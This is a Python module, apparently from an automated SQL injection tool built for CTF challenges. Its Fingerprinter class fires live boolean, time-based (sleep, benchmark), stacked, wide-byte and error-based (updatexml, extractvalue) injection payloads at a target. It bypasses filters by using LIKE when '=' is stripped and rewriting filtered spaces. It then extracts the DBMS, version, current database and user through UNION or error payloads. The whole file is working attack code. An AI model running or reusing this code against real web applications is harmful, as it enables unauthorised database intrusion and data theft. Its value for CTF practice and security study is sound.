"""注入类型识别：回显 / 报错 / 布尔 / 时间 / 堆叠 / 宽字节 + 版本探测。"""
from __future__ import annotations

import re
from typing import Optional

from .builder import PayloadBuilder
from .models import Fingerprint, InjectionPoint, ResponseInfo, similarity
from .session import HttpSession
from ..tampers import apply_form


class Fingerprinter:
    def __init__(self, session: HttpSession, injection: InjectionPoint,
                 R_err: Optional[ResponseInfo] = None,
                 builder: Optional[PayloadBuilder] = None):
        self.s = session
        self.inj = injection
        self.log = session.log
        self.R_err = R_err
        self.b = builder

    def _pre(self) -> str:
        return self.inj.base_value if self.inj.numeric \
            else self.inj.base_value + self.inj.closure

    def _tail(self) -> str:
        return self.inj.tail_literal()

    def _cond_payload(self, cond: str, joiner: str = "and") -> str:
        """形态感知的布尔条件 payload（builder 可用时走 WAF 感知链）。"""
        fn = {"or": self.b.logic_or, "and": self.b.logic_and,
              "xor": self.b.logic_xor,
              "arith": self.b.logic_arith}.get(joiner, self.b.logic_and)
        if self.b is not None:
            return self.b.wrap(fn(cond))
        if joiner == "arith":
            return f"{self._pre()}-{apply_form(f'({cond})', self.inj.form)}{self._tail()}"
        return f"{self._pre()}{apply_form(f' {joiner} ({cond})', self.inj.form)}{self._tail()}"

    def run(self, waf) -> Fingerprint:
        self.waf = waf
        fp = Fingerprint()
        fp.error_visible = bool(self.R_err and self.R_err.has_sql_error())
        fp.echo_visible = bool(self.inj.echo_positions)
        notes = []

        # 布尔盲注（or 优先：登录框恒真=成功页；and：查询框真=基线；
        # xor：FinalSQL 类；arith：「都过滤了」类减法两态）
        for joiner in ("or", "and", "xor", "arith"):
            if joiner == "arith":
                if waf.is_filtered("="):
                    # = 被剥离时 1=1 → 11 恒常量无两态（web209 实测），
                    # 减法两态改用 0/1 常量对：-(0) 匹配全表、-(1) 无行
                    true_cond, false_cond = "0", "1"
                else:
                    true_cond, false_cond = "1=1", "1=2"
            elif waf.is_filtered("="):
                # = 被剥离时 and(11)/and(12) 双双恒真（web209 实测），
                # 参照对改 like：and((1)like(1)) 真 / and((1)like(2)) 假
                true_cond, false_cond = "(1)like(1)", "(1)like(2)"
            else:
                true_cond, false_cond = "1=1", "1=2"
            t = self.s.request_value(self._cond_payload(true_cond, joiner))
            f = self.s.request_value(self._cond_payload(false_cond, joiner))
            # 逐行比较优先：长页面里只差一行（登录成功/密码错误的 5.8KB
            # 登录页相似度 0.998）会被 0.995 阈值吃掉 → 布尔被误判不可用
            # （ctf2 #47 GYCTF EasySQL 实测）
            if t.status_code <= 0:
                fp.boolean_oracle = False
            elif t.status_code != f.status_code or t.body != f.body:
                la, lb = t.body.splitlines(), f.body.splitlines()
                if len(la) != len(lb):
                    fp.boolean_oracle = True
                elif any(x != y and (x.strip() or y.strip())
                         for x, y in zip(la, lb)):
                    fp.boolean_oracle = True
                else:
                    fp.boolean_oracle = similarity(t, f) < 0.995
            else:
                fp.boolean_oracle = False
            if fp.boolean_oracle:
                break

        # 时间盲注（有 union 回显时无意义：省 4×sleep 的十几秒）
        if fp.echo_visible:
            notes.append("已有回显位，跳过时间盲注探测")
        elif not waf.is_filtered("sleep"):
            for joiner in ("or", "and", "xor", "arith"):
                r = self.s.request_value(self._cond_payload("sleep(3)", joiner))
                if r.elapsed_ms >= 2800:
                    fp.time_oracle = True
                    break
            if not fp.time_oracle and not waf.is_filtered("benchmark"):
                # sleep 被目标拦（扫描看不见，web217 类）→ benchmark 兜底
                r = self.s.request_value(
                    self._cond_payload("benchmark(1000000,md5(0x616263))", "or"))
                if r.elapsed_ms >= 3000:
                    fp.time_oracle = True
                    notes.append("sleep 不可用，benchmark 延时可用")
        else:
            notes.append("sleep 被过滤，时间盲注判定受限")

        # 堆叠（select 被滤时用 SET @a=sleep 探测，绕开关键字依赖）
        # 有回显位时堆叠对解题不是必需：跳过，省 sleep(3) 的几次等待
        if fp.echo_visible:
            pass
        elif not waf.is_filtered(";"):
            if not waf.is_filtered("select"):
                core = apply_form(";select sleep(3)", self.inj.form)
                r = self.s.request_value(f"{self._pre()}{core}{self._tail()}")
                fp.stacked = r.elapsed_ms >= 2800 and not r.has_sql_error()
            if not fp.stacked and not waf.is_filtered("sleep"):
                core = apply_form(";SET @a=sleep(3)", self.inj.form)
                r = self.s.request_value(f"{self._pre()}{core}{self._tail()}")
                fp.stacked = r.elapsed_ms >= 2800
            if fp.stacked:
                notes.append("堆叠注入可用（mysqli_multi_query）")
        else:
            notes.append("分号被过滤，堆叠判定受限")

        # 宽字节（引号被处理的场景才有意义）
        if waf.is_filtered("'"):
            r = self.s.request_value(self.inj.base_value + "\xdf'")
            fp.widebyte = r.has_sql_error() or (
                self.R_err is not None and similarity(r, self.R_err) > 0.95)
            if fp.widebyte:
                notes.append("宽字节注入可行（%df 吞掉转义反斜杠）")

        # DBMS 识别 + 版本 / 当前库（快速通道：union 回显 > 报错）
        if fp.echo_visible and not waf.is_filtered("union", "select"):
            self._identify_dbms_via_union(fp)
        elif fp.error_visible and not waf.is_filtered("updatexml", "extractvalue"):
            self._version_via_error(fp, waf)

        for n in notes:
            self.log("INFO", f"[指纹] {n}")
        self.log("INFO", f"[指纹] {fp.to_dict()}")
        return fp

    # ------------------------------------------------------------------
    def _union_core(self, cols: list) -> str:
        """union select 核心：按形态变换 + 空格被滤时自动降级（web209 类）。"""
        from ..tampers import auto_space, form_sep
        core = apply_form("union select " + ",".join(cols), self.inj.form)
        if " " in core and getattr(self, "waf", None) is not None \
                and self.waf.is_filtered("space"):
            core = auto_space(core, self.waf.is_filtered("/*", "*/", "*"),
                              self.waf.is_filtered("(", ")"))
        return core

    def _union_echo(self, expr: str):
        """把标量表达式放到回显位并发送，返回响应体。"""
        from ..tampers import form_sep
        n = self.inj.column_count or 2
        cols = ["null"] * n
        pos = (self.inj.echo_positions or [1])[0] - 1
        cols[pos] = expr
        core = self._union_core(cols)
        pre = f"0{self.inj.closure}"
        if not self.inj.closure:
            pre += form_sep(self.inj.form) if self.inj.form != "classic" else " "
        r = self.s.request_value(f"{pre}{core}{self.inj.comment}")
        self._last_union_payload = f"{pre}{core}{self.inj.comment}"
        return r.body

    def _identify_dbms_via_union(self, fp: Fingerprint):
        """用 union 回显识别 DBMS：sqlite_version / version(PostgreSQL 字样) / version。"""
        body = self._union_echo("sqlite_version()")
        m = re.search(r"(3\.[0-9]+[0-9.]*[0-9])", body)
        # 注：识别 payload 由 _union_echo 统一记录
        if m and "sqlite" not in body.lower().split("3.")[0][:20]:
            # sqlite_version() 返回纯数字版本（如 3.44.2）
            fp.dbms, fp.version = "SQLite", m.group(1)
            self.log("INFO", f"[指纹] 识别 DBMS: SQLite {fp.version}")
            self.s.record_step("识别 DBMS：SQLite", self._last_union_payload,
                               "SQLite 用 sqlite_master（无 information_schema），"
                               "# 不是注释符、无 ascii()/sleep()")
            return
        body = self._union_echo("version()")
        if "postgres" in body.lower():
            fp.dbms = "PostgreSQL"
            mver = re.search(r"([0-9]+\.[0-9]+(\.[0-9]+)?)", body)
            fp.version = mver.group(1) if mver else ""
            self.log("INFO", f"[指纹] 识别 DBMS: PostgreSQL {fp.version}")
            self.s.record_step("识别 DBMS：PostgreSQL", self._last_union_payload,
                               "PG：|| 为字符串拼接，group_concat 需换 string_agg")
            return
        # 默认 MySQL：版本/库/用户一并取回
        body = self._union_echo("concat_ws(0x7e,version(),database(),user())")
        # 排除双引号：JSON 回显（如 ctf.show api）中 user() 后面紧跟 `","username":`
        m = re.search(r'([0-9]+\.[0-9]+\.[0-9]+[^~\s<"]*)~([^~\s<"]+)~([^~\s<"]+)', body)
        if m:
            fp.version, fp.current_db, fp.current_user = m.groups()
        fp.dbms = "MySQL"
        self.log("INFO", f"[指纹] 识别 DBMS: MySQL {fp.version}")
        self.s.record_step("识别 DBMS：MySQL", self._last_union_payload,
                           "version()/database()/user() 均可用")

    def _version_via_union(self, fp: Fingerprint):
        from ..tampers import form_sep
        n = self.inj.column_count or 2
        cols = ["null"] * n
        pos = (self.inj.echo_positions or [1])[0] - 1
        cols[pos] = "concat_ws(0x7e,version(),database(),user())"
        core = self._union_core(cols)
        pre = f"0{self.inj.closure}"
        if not self.inj.closure:
            pre += form_sep(self.inj.form) if self.inj.form != "classic" else " "
        r = self.s.request_value(f"{pre}{core}{self.inj.comment}")
        m = re.search(r'([0-9]+\.[0-9]+\.[0-9]+[^\s~"]*)~([^~\s<"]+)~([^\s~<"]+)', r.body)
        if m:
            fp.version, fp.current_db, fp.current_user = m.group(1), m.group(2), m.group(3)

    def _version_via_error(self, fp: Fingerprint, waf):
        fn = "updatexml" if not waf.is_filtered("updatexml") else "extractvalue"
        payload = (f"{self._pre()} and {fn}(1,concat(0x7e,version(),0x7e),1)"
                   f"{self._tail() if fn == 'updatexml' else ''}")
        if fn == "extractvalue":
            payload = f"{self._pre()} and extractvalue(1,concat(0x7e,version(),0x7e)){self._tail()}"
        r = self.s.request_value(payload)
        m = re.search(r"XPATH syntax error:\s*'~?([^~']+)", r.body)
        if m:
            fp.version = m.group(1)
